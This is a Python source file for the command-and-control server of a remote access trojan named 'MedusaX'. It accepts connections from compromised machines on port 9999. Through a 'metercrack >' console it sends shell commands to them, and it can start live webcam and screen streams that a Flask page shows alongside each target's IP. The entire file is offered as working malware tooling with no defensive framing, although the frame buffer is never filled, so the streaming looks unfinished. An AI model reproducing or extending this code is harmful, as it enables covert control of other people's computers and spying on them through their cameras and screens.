import socket
import threading
import requests
import os
import sys
import time
from flask import Flask, Response
from colorama import Fore, Style

app = Flask(__name__)

clients = {}
streaming = {"status": "Stopped", "start_time": None, "target_ip": None}
stream_type = None
frame_buffer = None

def handle_client(client_socket, address):
    global frame_buffer, stream_type, streaming

    clients[address] = client_socket
    print(f"{Fore.GREEN}[ + ] Connection established with {address}{Style.RESET_ALL}")

    while True:
        try:
            command = input("metercrack > ")

            # If the command starts with "!", it's a MedusaX command
            if command.startswith("!"):
                client_socket.send(command.encode())
            else:
                # Otherwise, it's a shell command
                client_socket.send(command.encode())

            # Handle streaming commands
            if command.startswith("!webcam_stream") or command.startswith("!screen_stream"):
                stream_type = "webcam" if "webcam" in command else "screen"
                streaming["status"] = "Playing"
                streaming["start_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
                streaming["target_ip"] = address[0]

                print(f"{Fore.YELLOW}[ * ] Starting...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[ * ] Preparing player...{Style.RESET_ALL}")
                
                threading.Thread(target=start_streaming_server).start()

        except Exception as e:
            print(f"{Fore.RED}[ - ] Error: {e}{Style.RESET_ALL}")
            break

def start_streaming_server():
    print(f"{Fore.GREEN}Opening player at: http://127.0.0.1:5000/{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[ * ] Streaming...{Style.RESET_ALL}")
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

@app.route("/")
def stream_page():
    return f"""
    <html>
    <head><title>MedusaX Stream</title></head>
    <body>
        <h1>MedusaX Live Stream</h1>
        <p>Target IP: {streaming["target_ip"]}</p>
        <p>Start Time: {streaming["start_time"]}</p>
        <p>Status: {streaming["status"]}</p>
        <img src="/video_feed">
    </body>
    </html>
    """

@app.route("/video_feed")
def video_feed():
    def generate():
        global frame_buffer
        while True:
            if frame_buffer:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame_buffer + b'\r\n')

    return Response(generate(), mimetype="multipart/x-mixed-replace; boundary=frame")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print(f"{Fore.CYAN}[*] MedusaX Server Listening on Port 9999...{Style.RESET_ALL}")

    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr)).start()

if __name__ == "__main__":
    main()
